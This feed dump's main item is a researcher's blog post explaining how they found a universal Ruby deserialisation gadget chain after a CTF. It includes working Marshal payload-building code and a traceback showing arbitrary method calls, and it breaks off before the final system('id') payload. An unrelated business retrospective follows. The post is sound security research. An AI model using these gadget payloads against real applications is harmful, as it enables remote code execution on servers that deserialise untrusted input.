January 8, 2021 | https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html | <a href="https://web.archive.org/web/*/https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content_wrap">
    <section id="main_content">
      <article itemscope="" itemtype="http://schema.org/BlogPosting">
  

  <div itemprop="articleBody">
    <p>One of the challenges I wrote for <a href="https://ctftime.org/event/1121">pbctf 2020</a> involved exploiting deserialisation in a rails app to get code execution and retrieve the flag. The challenge was running with ruby 2.7.2 and rails 6.1, which meant that the existing public gadgets no longer worked and players had to discover a new one.</p>

<p>While researching, I came across a fantastic article published by <a href="https://twitter.com/elttam">elttam</a> titled <a href="https://www.elttam.com/blog/ruby-deserialization/">Ruby 2.x Universal RCE Deserialization Gadget Chain</a>. It goes into great detail on how they came up with a universal gadget that did not require anything other than the default gems to be loaded, well worth a read if you haven’t already.</p>

<p>Since the challenge was written using rails, there was a lot more gems and classes to choose from compared to just the defaults. There were a few great solutions to the challenge by players, the one I found combined the original <code>DeprecatedInstanceVariableProxy</code> gadget to call the <code>execute</code> method on <a href="https://github.com/rails/rails/blob/v6.1.0.rc1/activemodel/lib/active_model/attribute_methods.rb#L369">ActiveModel::AttributeMethods::ClassMethods::CodeGenerator</a> to achieve code execution.</p>

<p>After the ctf was over I decided to keep looking around to see if I could find another universal gadget, as the <code>Gem::StubSpecification</code> gadget used in the elttam article <a href="https://github.com/ruby/ruby/commit/1eaacb1ef538fe5af2fe231bb340fc39fef67547#diff-5daf0b4d40af647b25014bfbd30abaa25e34bd298d8503c180bb1f59edbdb885">was patched</a> in ruby 2.7+.</p>

<p>I started off trying to find a class to be used as a replacement for <code>Gem::StubSpecification</code>, something that allowed for code execution, eval, or the ability to call arbitrary methods. Using the same <code>autoload</code> trick in the elttam article and lots of regex searches in RubyMine, I came across <a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/net/protocol.rb#L458">Net::WriteAdapter</a>:</p>

<div><div><pre><code><span>class</span> <span>WriteAdapter</span>
  <span>def</span> <span>initialize</span><span>(</span><span>socket</span><span>,</span> <span>method</span><span>)</span>
    <span>@socket</span> <span>=</span> <span>socket</span>
    <span>@method_id</span> <span>=</span> <span>method</span>
  <span>end</span>

  <span>def</span> <span>inspect</span>
    <span>"#&lt;</span><span>#{</span><span>self</span><span>.</span><span>class</span><span>}</span><span> socket=</span><span>#{</span><span>@socket</span><span>.</span><span>inspect</span><span>}</span><span>&gt;"</span>
  <span>end</span>

  <span>def</span> <span>write</span><span>(</span><span>str</span><span>)</span>
    <span>@socket</span><span>.</span><span>__send__</span><span>(</span><span>@method_id</span><span>,</span> <span>str</span><span>)</span>
  <span>end</span>

  <span>alias</span> <span>print</span> <span>write</span>

  <span>def</span> <span>&lt;&lt;</span><span>(</span><span>str</span><span>)</span>
    <span>write</span> <span>str</span>
    <span>self</span>
  <span>end</span>

  <span>def</span> <span>puts</span><span>(</span><span>str</span> <span>=</span> <span>''</span><span>)</span>
    <span>write</span> <span>str</span><span>.</span><span>chomp</span><span>(</span><span>"</span><span>\n</span><span>"</span><span>)</span> <span>+</span> <span>"</span><span>\n</span><span>"</span>
  <span>end</span>

  <span>def</span> <span>printf</span><span>(</span><span>*</span><span>args</span><span>)</span>
    <span>write</span> <span>sprintf</span><span>(</span><span>*</span><span>args</span><span>)</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>It looked very promising as <code>@socket</code> and <code>@method_id</code> could both be set to anything, and if a way to call any of the methods <code>write</code>, <code>print</code>, <code>&lt;&lt;</code>, <code>puts</code> or <code>printf</code> could be found it would allow any method to be called on an object.</p>

<p>After many dead ends and a lot more searching I found <a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/net/protocol.rb#L113">Net::BufferedIO</a>, which had the following <code>LOG</code> method:</p>

<div><div><pre><code>    <span>def</span> <span>read</span><span>(</span><span>len</span><span>,</span> <span>dest</span> <span>=</span> <span>''</span><span>.</span><span>b</span><span>,</span> <span>ignore_eof</span> <span>=</span> <span>false</span><span>)</span>
      <span>LOG</span> <span>"reading </span><span>#{</span><span>len</span><span>}</span><span> bytes..."</span>
    <span>#...</span>

    <span>def</span> <span>LOG</span><span>(</span><span>msg</span><span>)</span>
      <span>return</span> <span>unless</span> <span>@debug_output</span>
      <span>@debug_output</span> <span>&lt;&lt;</span> <span>msg</span> <span>+</span> <span>"</span><span>\n</span><span>"</span>
    <span>end</span>

    <span>def</span> <span>eof?</span>
      <span>@io</span><span>.</span><span>eof?</span>
    <span>end</span>
</code></pre></div></div>

<p>This was called by both <code>read</code> and <code>readall</code>, so it could be chained to <code>Net::WriteAdapter</code> if a way to call <code>read</code> could be found.</p>

<p>I had also started looking for initial/kick-off gadgets, similar to the <code>Gem::Requirement</code> one that called <code>each</code> in the elttam article. One of the interesting ones found was <a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/version.rb#L275">Gem::Version</a> which allowed calling <code>to_s</code> on any object (relevant code):</p>

<div><div><pre><code><span># we can fully control the objects in this array</span>
<span>def</span> <span>marshal_load</span><span>(</span><span>array</span><span>)</span>
  <span>initialize</span> <span>array</span><span>[</span><span>0</span><span>]</span>
<span>end</span>

<span>def</span> <span>initialize</span><span>(</span><span>version</span><span>)</span>
  <span># first thing is the version check</span>
  <span>unless</span> <span>self</span><span>.</span><span>class</span><span>.</span><span>correct?</span><span>(</span><span>version</span><span>)</span>
    <span>raise</span> <span>ArgumentError</span><span>,</span> <span>"Malformed version number string </span><span>#{</span><span>version</span><span>}</span><span>"</span>
  <span>end</span>

  <span>version</span> <span>=</span> <span>0</span> <span>if</span> <span>version</span><span>.</span><span>is_a?</span><span>(</span><span>String</span><span>)</span> <span>&amp;&amp;</span> <span>version</span> <span>=~</span> <span>/\A\s*\Z/</span>
  <span>@version</span> <span>=</span> <span>version</span><span>.</span><span>to_s</span><span>.</span><span>strip</span><span>.</span><span>gsub</span><span>(</span><span>"-"</span><span>,</span><span>".pre."</span><span>)</span>
  <span>@segments</span> <span>=</span> <span>nil</span>
<span>end</span>

<span>def</span> <span>self</span><span>.</span><span>correct?</span><span>(</span><span>version</span><span>)</span>
  <span>unless</span> <span>Gem</span><span>::</span><span>Deprecate</span><span>.</span><span>skip</span>
    <span>warn</span> <span>"nil versions are discouraged and will be deprecated in Rubygems 4"</span> <span>if</span> <span>version</span><span>.</span><span>nil?</span>
  <span>end</span>

  <span># here to_s is called on our object</span>
  <span>!!</span><span>(</span><span>version</span><span>.</span><span>to_s</span> <span>=~</span> <span>ANCHORED_VERSION_PATTERN</span><span>)</span>
<span>end</span>
</code></pre></div></div>

<p>To find these methods, I slightly modified the existing <code>marshal_load</code> method check to quickly see what implemented a function:</p>

<div><div><pre><code><span>def</span> <span>check</span><span>(</span><span>functions</span><span>)</span>
  <span>ObjectSpace</span><span>.</span><span>each_object</span><span>(</span><span>::</span><span>Class</span><span>)</span> <span>do</span> <span>|</span><span>obj</span><span>|</span>
    <span>all_methods</span> <span>=</span> <span>(</span><span>obj</span><span>.</span><span>instance_methods</span> <span>+</span> <span>obj</span><span>.</span><span>private_instance_methods</span><span>).</span><span>uniq</span>

    <span>functions</span><span>.</span><span>each</span> <span>do</span> <span>|</span><span>function</span><span>|</span>
      <span>if</span> <span>all_methods</span><span>.</span><span>include?</span> <span>function</span>
        <span>method_origin</span> <span>=</span> <span>obj</span><span>.</span><span>instance_method</span><span>(</span><span>function</span><span>).</span><span>inspect</span><span>[</span><span>/\((.*)\)/</span><span>,</span> <span>1</span><span>]</span> <span>||</span> <span>obj</span><span>.</span><span>to_s</span>
        <span>unless</span> <span>method_origin</span><span>.</span><span>nil?</span> <span>||</span> <span>method_origin</span> <span>==</span> <span>''</span>
          <span>puts</span> <span>obj</span>
          <span>puts</span> <span>"  </span><span>#{</span><span>function</span><span>}</span><span> defined by </span><span>#{</span><span>method_origin</span><span>}</span><span>"</span>
          <span>puts</span> <span>"  ancestors = </span><span>#{</span><span>obj</span><span>.</span><span>ancestors</span><span>}</span><span>"</span>
          <span>puts</span>
        <span>end</span>
      <span>end</span>
    <span>end</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>This opened up more options for finding gadgets, as there are quite a few <code>to_s</code> methods implemented compared to <code>marshal_load</code>. A few examples that were found:</p>

<p><a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/resolver/activation_request.rb#L79">Gem::Resolver::ActivationRequest</a> which would allow for <code>name</code>, <code>version</code>, or <code>platform</code> to be called on a controllable object:</p>

<div><div><pre><code><span>class</span> <span>Gem::Resolver::ActivationRequest</span>
  <span>alias_method</span> <span>:to_s</span><span>,</span> <span>:full_name</span>

  <span>def</span> <span>full_name</span>
    <span>name_tuple</span><span>.</span><span>full_name</span>
  <span>end</span>

  <span>def</span> <span>name_tuple</span>
    <span>@name_tuple</span> <span>||=</span> <span>Gem</span><span>::</span><span>NameTuple</span><span>.</span><span>new</span><span>(</span><span>name</span><span>,</span> <span>version</span><span>,</span> <span>platform</span><span>)</span>
  <span>end</span>

  <span>def</span> <span>name</span>
    <span>@spec</span><span>.</span><span>name</span>
  <span>end</span>

  <span>def</span> <span>version</span>
    <span>@spec</span><span>.</span><span>version</span>
  <span>end</span>

  <span>def</span> <span>platform</span>
    <span>@spec</span><span>.</span><span>platform</span>
  <span>end</span>
</code></pre></div></div>

<p><a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/optparse.rb#L2085">OptionParser::ParseError</a> which allowed <code>join</code> to be called, as well as the <code>[]</code> method with a controlled argument:</p>

<div><div><pre><code><span>class</span> <span>ParseError</span> <span>&lt;</span> <span>RuntimeError</span>
  <span>def</span> <span>initialize</span><span>(</span><span>*</span><span>args</span><span>,</span> <span>additional: </span><span>nil</span><span>)</span>
    <span>@additional</span> <span>=</span> <span>additional</span>
    <span>@arg0</span><span>,</span> <span>=</span> <span>args</span>
    <span>@args</span> <span>=</span> <span>args</span>
    <span>@reason</span> <span>=</span> <span>nil</span>
  <span>end</span>

  <span>attr_reader</span> <span>:args</span>
  <span>attr_writer</span> <span>:reason</span>
  <span>attr_accessor</span> <span>:additional</span>

  <span>alias</span> <span>to_s</span> <span>message</span>

  <span>def</span> <span>message</span>
    <span>"</span><span>#{</span><span>reason</span><span>}</span><span>: </span><span>#{</span><span>args</span><span>.</span><span>join</span><span>(</span><span>' '</span><span>)</span><span>}#{</span><span>additional</span><span>[</span><span>@arg0</span><span>]</span> <span>if</span> <span>additional</span><span>}</span><span>"</span>
  <span>end</span>

  <span>def</span> <span>reason</span>
    <span>@reason</span> <span>||</span> <span>self</span><span>.</span><span>class</span><span>::</span><span>Reason</span>
  <span>end</span>
</code></pre></div></div>

<p>I went back to the other end of the gadget chain and started looking for places that called <code>read</code> on an object, and eventually discovered
<a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_reader.rb#L61">Gem::Package::TarReader</a> and <a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_header.rb#L103">Gem::Package::TarHeader</a>:</p>

<div><div><pre><code><span>class</span> <span>Gem::Package::TarReader</span>
  <span>def</span> <span>each</span>
    <span>return</span> <span>enum_for</span> <span>__method__</span> <span>unless</span> <span>block_given?</span>

    <span>use_seek</span> <span>=</span> <span>@io</span><span>.</span><span>respond_to?</span><span>(</span><span>:seek</span><span>)</span>

    <span>until</span> <span>@io</span><span>.</span><span>eof?</span> <span>do</span>
      <span>header</span> <span>=</span> <span>Gem</span><span>::</span><span>Package</span><span>::</span><span>TarHeader</span><span>.</span><span>from</span> <span>@io</span>
      <span>return</span> <span>if</span> <span>header</span><span>.</span><span>empty?</span>
  <span># snip</span>
  <span>end</span>
<span>end</span>

<span>class</span> <span>Gem::Package::TarHeader</span>
  <span>def</span> <span>self</span><span>.</span><span>from</span><span>(</span><span>stream</span><span>)</span>
      <span>header</span> <span>=</span> <span>stream</span><span>.</span><span>read</span> <span>512</span>
      <span>empty</span> <span>=</span> <span>(</span><span>EMPTY_HEADER</span> <span>==</span> <span>header</span><span>)</span>
  <span># snip</span>
  <span>end</span>
<span>end</span>
</code></pre></div></div>

<p>Since there already was initial gadget to call <code>each</code> (thanks to elttam) it looked very promising, a chain such as <code>Gem::Requirement#marshal_load -&gt; Gem::Package::TarReader#each -&gt; Gem::Package::TarHeader#from -&gt; Net::BufferedIO#read -&gt; Net::BufferedIO#LOG -&gt; Net::WriteAdapter#&lt;&lt;</code> could be created. This would allow for any method to be called, so long as it accepted a single parameter. Unfortunately, the content of the parameter was not controllable, but it was still a very powerful gadget.</p>

<p>For <code>TarHeader.from</code> to be called, a class that had a falsey <code>eof?</code> method was needed to pass the conditional. A suitable choice was<a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/package/tar_reader/entry.rb#L60">Gem::Package::TarReader::Entry</a> as the result of the <code>eof?</code> call was easily controllable:</p>

<div><div><pre><code><span>class</span> <span>Gem::Package::TarReader::Entry</span>
  <span>##</span>
  <span># Is the tar entry closed?</span>

  <span>def</span> <span>closed?</span>
    <span>@closed</span>
  <span>end</span>

  <span>##</span>
  <span># Are we at the end of the tar entry?</span>

  <span>def</span> <span>eof?</span>
    <span>check_closed</span>

    <span>@read</span> <span>&gt;=</span> <span>@header</span><span>.</span><span>size</span>
  <span>end</span>

  <span>def</span> <span>check_closed</span> <span># :nodoc:</span>
    <span>raise</span> <span>IOError</span><span>,</span> <span>"closed </span><span>#{</span><span>self</span><span>.</span><span>class</span><span>}</span><span>"</span> <span>if</span> <span>closed?</span>
  <span>end</span>
</code></pre></div></div>

<p>All of this could now be put together, giving the ability to call arbitrary methods on an object:</p>

<div><div><pre><code><span># Autoload the required classes</span>
<span>Gem</span><span>::</span><span>SpecFetcher</span>
<span>Gem</span><span>::</span><span>Installer</span>

<span># prevent the payload from running when we Marshal.dump it</span>
<span>module</span> <span>Gem</span>
  <span>class</span> <span>Requirement</span>
    <span>def</span> <span>marshal_dump</span>
      <span>[</span><span>@requirements</span><span>]</span>
    <span>end</span>
  <span>end</span>
<span>end</span>

<span>wa</span> <span>=</span> <span>Net</span><span>::</span><span>WriteAdapter</span><span>.</span><span>new</span><span>(</span><span>Kernel</span><span>,</span> <span>:vakzz</span><span>)</span>

<span>io</span> <span>=</span> <span>Gem</span><span>::</span><span>Package</span><span>::</span><span>TarReader</span><span>::</span><span>Entry</span><span>.</span><span>allocate</span>
<span>io</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@read'</span><span>,</span> <span>0</span><span>)</span>
<span>io</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@header'</span><span>,</span> <span>"aaa"</span><span>)</span>

<span>n</span> <span>=</span> <span>Net</span><span>::</span><span>BufferedIO</span><span>.</span><span>allocate</span>
<span>n</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@io'</span><span>,</span> <span>io</span><span>)</span>
<span>n</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@debug_output'</span><span>,</span> <span>wa</span><span>)</span>

<span>t</span> <span>=</span> <span>Gem</span><span>::</span><span>Package</span><span>::</span><span>TarReader</span><span>.</span><span>allocate</span>
<span>t</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@io'</span><span>,</span> <span>n</span><span>)</span>

<span>r</span> <span>=</span> <span>Gem</span><span>::</span><span>Requirement</span><span>.</span><span>allocate</span>
<span>r</span><span>.</span><span>instance_variable_set</span><span>(</span><span>'@requirements'</span><span>,</span> <span>t</span><span>)</span>


<span>payload</span> <span>=</span> <span>Marshal</span><span>.</span><span>dump</span><span>([</span><span>Gem</span><span>::</span><span>SpecFetcher</span><span>,</span> <span>Gem</span><span>::</span><span>Installer</span><span>,</span> <span>r</span><span>])</span>
<span>puts</span> <span>payload</span><span>.</span><span>inspect</span>
<span>puts</span> <span>Marshal</span><span>.</span><span>load</span><span>(</span><span>payload</span><span>)</span>
</code></pre></div></div>

<div><div><pre><code>Traceback (most recent call last):
       13: from /Users/will/.rubies/ruby-2.7.2/bin/irb:23:in `&lt;main&gt;'
       12: from /Users/will/.rubies/ruby-2.7.2/bin/irb:23:in `load'
       11: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/gems/2.7.0/gems/irb-1.2.6/exe/irb:11:in `&lt;top (required)&gt;'
       10: from (irb):297
        9: from (irb):297:in `load'
        8: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/requirement.rb:207:in `marshal_load'
        7: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/requirement.rb:297:in `fix_syck_default_key_in_requirements'
        6: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/package/tar_reader.rb:61:in `each'
        5: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/rubygems/package/tar_header.rb:103:in `from'
        4: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
        3: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
        2: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:464:in `&lt;&lt;'
        1: from /Users/will/.rubies/ruby-2.7.2/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
NoMethodError (undefined method `vakzz' for Kernel:Module)
</code></pre></div></div>

<p>The issue was that the argument to the call was not controllable, but now nearly any class and method could be used in the gadget chain. In the original search for ways to call the <code>Net::WriteAdapter</code> methods, I had found quite a few that were discarded (due to being unlikely to have ways to call them) which could now be used. One of them was <a href="https://github.com/ruby/ruby/blob/v2_7_2/lib/rubygems/request_set.rb#L399">Gem::RequestSet#resolve</a>:</p>

<div><div><pre><code><span>def</span> <span>resolve</span><span>(</span><span>set</span> <span>=</span> <span>Gem</span><span>::</span><span>Resolver</span><span>::</span><span>BestSet</span><span>.</span><span>new</span><span>)</span>
  <span>@sets</span> <span>&lt;&lt;</span> <span>set</span>
  <span>@sets</span> <span>&lt;&lt;</span> <span>@git_set</span>
  <span># snip</span>
<span>end</span>
</code></pre></div></div>

<p>This was perfect as <code>@sets</code> and <code>@git_set</code> were both fully controllable, and the argument <code>set</code> would be assigned the log message <code>reading 512 bytes...</code> from the gadget chain. Another <code>Net::WriteAdapter</code> gadget could be used for <code>@sets</code>, it would end up calling the method with the uncontrolled data first but then again with the controlled <code>@git_set</code>.</p>

<p>The final gadget could then be constructed to trigger a call to <code>Kernel.system("id")</code>:</p>

<div><div><pre><code><span># Autoload the required classes</span>
<span>Gem</span><span>::</span><span>SpecFetcher</span>
<span>Gem</span><span>::</span><span>Installer</span>

<span># prevent the payload from …</span></code></pre></div></div></div></article></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html">https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</a></em></p>]]>
            </description>
            <link>https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684217</guid>
            <pubDate>Fri, 08 Jan 2021 13:01:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Writing Clean Code. A function main role is avoid duplicated code? No, it's more]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25684158">thread link</a>) | @relu_mesaros
<br/>
January 8, 2021 | https://flawless-bits.com/blog/clean-code-functions-and-methods | <a href="https://web.archive.org/web/*/https://flawless-bits.com/blog/clean-code-functions-and-methods">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://flawless-bits.com/blog/clean-code-functions-and-methods</link>
            <guid isPermaLink="false">hacker-news-small-sites-25684158</guid>
            <pubDate>Fri, 08 Jan 2021 12:54:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A lean HTML editor with instant preview]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25683798">thread link</a>) | @mg
<br/>
January 8, 2021 | https://no-gravity.github.io/html_editor/ | <a href="https://web.archive.org/web/*/https://no-gravity.github.io/html_editor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://no-gravity.github.io/html_editor/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683798</guid>
            <pubDate>Fri, 08 Jan 2021 12:06:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zero to $50000 in six months: growing Ritza, a technical publishing company]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683401">thread link</a>) | @sixhobbits
<br/>
January 8, 2021 | https://sixhobbits.github.io/hugoblog/posts/2020-retrospective/ | <a href="https://web.archive.org/web/*/https://sixhobbits.github.io/hugoblog/posts/2020-retrospective/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>For more background, you can find previous retrospectives for
<a href="https://sixhobbits.github.io/hugoblog/posts/2019-retrospective/"><!-- raw HTML omitted -->2019<!-- raw HTML omitted --></a>,
<a href="https://sixhobbits.github.io/hugoblog/posts/2020-q1-retrospective/"><!-- raw HTML omitted -->Q1
2020<!-- raw HTML omitted --></a>,
<a href="https://sixhobbits.github.io/hugoblog/posts/2020-04-retrospective/"><!-- raw HTML omitted -->April
2020<!-- raw HTML omitted --></a>,
and <a href="https://sixhobbits.github.io/hugoblog/posts/2020-05-retrospective/"><!-- raw HTML omitted -->May
2020<!-- raw HTML omitted --></a>.</p>
<p>In July, I founded <a href="https://ritza.co/">Ritza</a> - a technical publishing company that offers
(very) technical content marketing, developer advocacy as a service, and
a bunch of related publishing services. What does that mean exactly? We
publish ebooks, documentation, and blog articles, usually with the goal
of helping developers or technical managers in some way. For example, we
did <a href="https://codewithrepl.it/"><!-- raw HTML omitted -->https://codewithrepl.it<!-- raw HTML omitted --></a> as a
companion website for <a href="https://repl.it/"><!-- raw HTML omitted -->Repl.it<!-- raw HTML omitted --></a>. We offer this
content on a subscription basis.</p>
<p>The title is clickbait: I’ve been working on Ritza for quite a bit
longer than 6 months, but it only became ‘real’ in July this year as a
registered business which I was devoting 100% of my time to, and – from
what I’ve seen in Maker circles – writing about how you got your
initial revenue is the best way to 2x your revenue, so the title is also
an experiment in some ways.</p>
<p>I’ve gained a lot by reading about
<a href="https://www.coryzue.com/open/"><!-- raw HTML omitted -->other<!-- raw HTML omitted --></a>
<a href="https://twitter.com/SahinKevin/status/1334142235051520000"><!-- raw HTML omitted -->people’s<!-- raw HTML omitted --></a>
<a href="https://themakingof.carrd.co/"><!-- raw HTML omitted -->transparent<!-- raw HTML omitted --></a>
<a href="https://nomadlist.com/open"><!-- raw HTML omitted -->revenues<!-- raw HTML omitted --></a>. That said, talking about
money is still weird for me, and I think it’s harder to be fully
transparent when offering services instead of a SaaS - there is more
customized pricing both in charging for work and paying contractors and
talking money is a sure way to get emotions up and make people feel like
they got a bad deal.</p>
<p>Here are some high level figures for the last 6 months to get it out of
the way.</p>
<h2 id="revenue">Revenue</h2>
<p>Ritza made between $6000 and $14000 revenue each month between July and
December, with a total revenue of around $58000 for the last two
quarters of 2020.</p>
<p>This was below my target of hitting $20000/month in 2020, but –
especially given circumstances – this was way better than my worst case
predictions. There was no clear overall trend, but a definite drop off
in November and December, with July and October being our best
performing months.</p>
<p>All of our contracts are month-to-month and one client went quiet in
October. While most of our revenue comes from recurring contracts, we
also did some one-off work in July through October, but none in November
or December.</p>
<p>Nearly all of our costs are from paying writers, editors, and designers.
We additionally spent money on office space that we don’t use (over
$500/month for coworking space that is tied to my ‘visa facilitation’,
which is a requirement for my visa in the Netherlands), and accounting
costs. We pay a few dollars a month for various online services, such as
GSuite and various domains, and we have credits on DigitalOcean and AWS
which take care of all of our hosting for now. We also recently picked
up a subscription to <a href="https://www.semrush.com/"><!-- raw HTML omitted -->SemRush<!-- raw HTML omitted --></a> - a tool
that I think is overpriced and slightly shady, but which has proven its use
in better understanding what people are searching for.</p>
<p>Overall, this revenue allows me to pay myself a ‘salary’ that pays rent
in Europe, with more cash than my previous job as Head of Technology for
a South African EdTech startup.</p>
<p>That said, my plan B after quitting my previous role was to find a full
time job remotely or in Europe. I shopped around a bit and did some
interviews for roles that were offering $150k-$200k/year + benefits so
in terms of opportunity cost I am still ‘losing’ for now and it remains
to be seen how far Ritza can scale with its current business model.</p>
<h2 id="experiments-and-content">Experiments and content</h2>
<p>Our bread-and-butter service is producing technical content: writing
<a href="https://codewithrepl.it/"><!-- raw HTML omitted -->tutorials<!-- raw HTML omitted --></a> and
<a href="https://datarevenue.com/en-blog"><!-- raw HTML omitted -->blog<!-- raw HTML omitted --></a>
<a href="https://virtasant.com/blog/data-lake-vs-data-warehouse/"><!-- raw HTML omitted -->content<!-- raw HTML omitted --></a>.
While our mission is to unlock marketing budgets “for good” by making
this content available for free, we have also helped companies produce
and improve internal proprietary content that they then sell.</p>
<p>On the side, I have been playing around with the idea of building online
tools to help with producing and publishing content. None of these got
the attention they needed to get off the ground, but they remain on the
back burner as ideas I’d still like to work on. They included</p>
<ul>
<li>
<p><strong><a href="https://vsgraphs.ritza.co/"><!-- raw HTML omitted -->‘vs’ Graphs<!-- raw HTML omitted --></a> -</strong> a tool
inspired by <a href="https://medium.com/applied-data-science/the-google-vs-trick-618c8fd5359f"><!-- raw HTML omitted -->this
article<!-- raw HTML omitted --></a>.
I built this because I needed it - especially for writing articles
about ‘hot’ spaces like MLOps and DevOps, it’s easy to get
overwhelmed by the sheer number of tools, products, and services.
This visualisation makes it easy to explore a new area and find
the most popular products, as well as to find out how a specific
product ‘fits in’ (“Oh X plays in the same space as SageMaker”).
This is also useful to write ‘<a href="https://datarevenue.com/en-blog/data-dashboarding-streamlit-vs-dash-vs-shiny-vs-voila"><!-- raw HTML omitted -->x vs y vs
z<!-- raw HTML omitted --></a>’
articles, which turn out to be very low hanging fruit in terms of
ranking well on Google. If you’ve ever tried to find out how two
products or services compare and found yourself frustrated at all
the low quality ‘alternativeTo-like’ pages you’ll know why these
articles are useful, and I ended up also building a <a href="http://versus.ritza.co/"><!-- raw HTML omitted -->related
tool<!-- raw HTML omitted --></a> to outline these articles
automatically. The fun part about this was that I built it in a
single train ride using only my iPad and repl.it, which felt like
a big step in the direction of being able to code as a nomad.</p>
</li>
<li>
<p><strong><a href="https://ratemycopy.ritza.co/"><!-- raw HTML omitted -->Rate my Copy<!-- raw HTML omitted --></a></strong> - Also while
researching products and services, I got annoyed at how cliched
most landing page copy is, and even more annoyed by how
uninformative it is. I scraped over 20000 landing pages for online
products and services and built a database of the most commonly
used cliches.</p>
</li>
<li>
<p><strong><a href="https://ritza.co/experiments/opinionated-tutorial-publisher.html"><!-- raw HTML omitted -->Opinionated tutorial
Publisher<!-- raw HTML omitted --></a></strong> -
while most of our clients have their own systems already in place
to host the content we produce, I was frustrated at how hard it
was to generate a lightweight, good looking page with writing,
code samples, and images. There’s a long way to go on the design
still, but some of the other pieces are in place.</p>
</li>
</ul>
<p>I won’t link to all the content we produced in 2020, but some highlights
are</p>
<ul>
<li>
<p><strong><a href="https://www.codewithrepl.it/"><!-- raw HTML omitted -->CodeWithRepl.it<!-- raw HTML omitted --></a> -</strong> a set
of tutorials, also in book form. This was very well received on
reddit and continues to rank well for a variety of search terms. I
am strongly against most kinds of tracking, but caved at the end
of the year and installed Plausible Analytics on it, which also
makes it easy to share publicly everything we track:
<a href="https://plausible.io/codewithrepl.it"><!-- raw HTML omitted -->https://plausible.io/codewithrepl.it<!-- raw HTML omitted --></a>.
Traffic has died off a lot at the end of the year (based on some
server logs analytics I did), but rankings continue to improve and
I think the content is in pretty good shape now (we’ve done
several sets of updates since initially publishing it).</p>
</li>
<li>
<p><strong><a href="https://datarevenue.com/en-blog"><!-- raw HTML omitted -->DataRevenue Blog<!-- raw HTML omitted --></a></strong> -
This is the project I’ve personally learned the most from this
year, writing about everything from general machine learning
through BioTech (I didn’t even know what Metabolomics was in 2019,
so there was a steep learning curve to write some of the articles
about that).</p>
</li>
</ul>
<h2 id="growing-a-team">Growing a team</h2>
<p>While we initially mainly worked ad-hoc with contractors on various
projects, towards the end of the year Ritza started feeling like a real
company with a core team. <a href="https://dev.to/eugenedorfling/technical-writing-internship-it-can-only-get-better-from-here-10ma"><!-- raw HTML omitted -->Eugene
Dorfling<!-- raw HTML omitted --></a>
joined in October for a full time internship and is continuing in 2021
as an Associate Developer Advocate. Several other freelancers have
regularly worked on projects throughout the year. I’m still trying to
figure out if the next full time hire should be a senior writer (to take
over some of the writing I am doing), or a managing editor (to help out
with client feedback and all the nitty-gritty but super important
aspects of getting from ‘first draft’ to ‘production’), but I’m leaning
more towards the latter.</p>
<h2 id="what-is-ritza">What IS Ritza?</h2>
<p>Friends and family still don’t really understand what Ritza is. I get a
lot of “uh, so you make IT manuals, right? Isn’t that just telling
people to turn stuff off and on again until it works?”</p>
<p>Ritza is probably closest to a ‘content marketing agency’ at this stage.
But I really dislike most content marketing agencies. Not to name and
shame, but there’s definitely decent demand for very low cost content
such as
<a href="https://contentfly.com/blog/tag/content-sample/"><!-- raw HTML omitted -->https://contentfly.com/blog/tag/content-sample/<!-- raw HTML omitted --></a>,
and I honestly can’t see how that adds any value to the world at all, so
I want to avoid being pulled in that direction or associated with
content like that.</p>
<p>My initial response to this was to try to move towards “Developer
Advocacy as a Service”, but it doesn’t really roll off the tongue, and
I’m not sure that “Developer Advocacy” is actually a job that will
